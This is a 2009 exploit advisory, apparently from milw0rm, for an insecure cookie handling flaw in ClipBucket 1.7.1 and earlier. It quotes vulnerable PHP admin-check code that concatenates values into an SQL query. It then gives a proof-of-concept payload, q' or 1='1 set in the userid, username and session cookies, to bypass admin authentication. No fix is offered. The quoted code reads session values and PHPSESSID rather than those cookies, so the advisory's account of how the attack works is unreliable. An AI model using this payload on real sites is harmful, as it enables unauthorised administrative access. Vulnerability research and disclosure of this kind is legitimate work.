@@ -1,0 +1,90 @@
+                                            ||          ||   | ||
+                                     o_,_7 _||  . _o_7 _|| q_|_||  o_\\\_,
+                                    (  :  /    (_)    /           (      .
+
+                                             ___________________
+                                           _/QQQQQQQQQQQQQQQQQQQ\__
+                                        __/QQQ/````````````````\QQQ\___
+                                      _/QQQQQ/                  \QQQQQQ\
+                                     /QQQQ/``                    ```QQQQ\
+                                    /QQQQ/                          \QQQQ\
+                                   |QQQQ/    By  Qabandi             \QQQQ|
+                                   |QQQQ|                            |QQQQ|
+                                   |QQQQ|    From Kuwait, PEACE...   |QQQQ|
+                                   |QQQQ|                            |QQQQ|
+                                   |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
+                                    \QQQQ\                      __  /QQQQ/
+                                     \QQQQ\                    /QQ\_QQQQ/
+                                      \QQQQ\                   \QQQQQQQ/
+                                       \QQQQQ\                 /QQQQQ/_
+                                        ``\QQQQQ\_____________/QQQ/\QQQQ\_
+                                           ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
+                                              ```````````````````     `````
+
+=Vuln:		Clip Bucket <= 1.7.1 Insecure Cookie Handling
+=INFO:		http://clip-bucket.com/
+=BUY:  		---
+=Download:      http://clip-bucket.com/download
+=DORK:	  :) 
+
+                                  ____________
+                              _-=/:Conditions:\=-_
+````````````````````````````````````````````````````````````````````````````````
+
+Magic_quotes MUST BE OFF
+
+---------------------------------------===--------------------------------------
+
+                                _________________
+                            _-=/:Vulnerable_Code:\=-_
+````````````````````````````````````````````````````````````````````````````````
+// in "\includes\classes\user.class.php"
+
+	function admin_check(){
+		$admin = 'Admin';
+        if(isset($_COOKIE['userid']) && isset($_COOKIE['username']) && isset($_COOKIE['session']))
+        {
+		$userid = @$_SESSION['userid'];
+		$username = @$_SESSION['username'];
+		$session = @$_COOKIE['PHPSESSID'];
+
+					$query = mysql_query("SELECT * FROM users WHERE level='".$admin."' AND username ='".$username."' AND userid = '".$userid."' AND session='".$session."'");
+					if(mysql_num_rows($query)>0){
+					$answer = 1;
+                    return $answer;
+					}else{
+					$answer = 0;
+                    return $answer;
+					}
+        }
+		}
+
+---------------------------------------===--------------------------------------
+
+                                     _______
+                                 _-=/:P.o.C:\=-_
+````````````````````````````````````````````````````````````````````````````````
+Set Cookies:
+
+userid=q' or 1='1
+username=q' or 1='1
+session=q' or 1='1
+
+
+---------------------------------------===--------------------------------------
+
+                                    __________
+                                _-=/:SOLUTION:\=-_
+````````````````````````````````````````````````````````````````````````````````
+nah
+
+---------------------------------------===--------------------------------------
+ ______________________________________________________________________________
+/                                                                              \
+|      ----------------------------------------------------------------------  |
+\______________________________________________________________________________/
+                                \ No More Private /
+                                 `````````````````
+                           Salamz to All Muslim Hackers.
+
+# milw0rm.com [2009-07-24]
